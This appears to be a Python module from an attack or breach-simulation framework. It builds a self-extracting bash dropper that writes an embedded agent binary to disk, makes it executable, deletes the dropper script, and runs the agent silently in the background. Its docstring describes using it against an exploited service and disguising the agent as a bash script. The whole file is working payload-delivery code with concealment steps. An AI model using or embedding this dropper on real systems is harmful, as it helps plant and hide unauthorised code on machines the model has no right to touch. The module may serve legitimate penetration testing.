from pathlib import PurePath

AGENT_BINARY_WRAPPER_BASH_SCRIPT_TEMPLATE = b"""#!/bin/bash
umask 077

DROPPER_SCRIPT_PATH=$0

PAYLOAD_LINE=$(awk '/^__PAYLOAD_BEGINS__/ { print NR + 1; exit 0; }' $0)
AGENT_DST_PATH="%(agent_dst_path)s"

tail -n +${PAYLOAD_LINE} $0 > "$AGENT_DST_PATH"
chmod u+x "$AGENT_DST_PATH"

rm "$DROPPER_SCRIPT_PATH"

nohup env %(run_command)s &>/dev/null &

exit 0
__PAYLOAD_BEGINS__
%(agent_binary)s"""


def build_bash_dropper_script_template(agent_dst_path: PurePath, run_command: str) -> bytes:
    """
    Build a bash script template that will wrap the Agent binary.

    The script will be used to drop the Agent binary at a specified path and
    run it. This is useful if the service being exploited limits the number of
    characters that can be used to invoke the agent, or there is a reason to
    disguise the agent as a bash script. The agent binary will be embedded
    directly in the bash script, which is self-extracting.

    :param agent_dst_path: The path where the agent binary will be extracted
    :param run_command: The command to run the extracted agent binary

    :return: A bash script template that containins a placeholder for the agent
             binary
    """
    return AGENT_BINARY_WRAPPER_BASH_SCRIPT_TEMPLATE % {
        b"agent_dst_path": str(agent_dst_path).encode(),
        b"run_command": run_command.encode(),
        # Since we need a template for the bash script and we can't replace only some of the
        # variables in the wrapper template, we replace "agent_binary" with "%(agent_binary)s"
        # so that the template can be formatted again later to add the binary to the script
        # when we have the necessary information.
        b"agent_binary": b"%(agent_binary)s",
    }
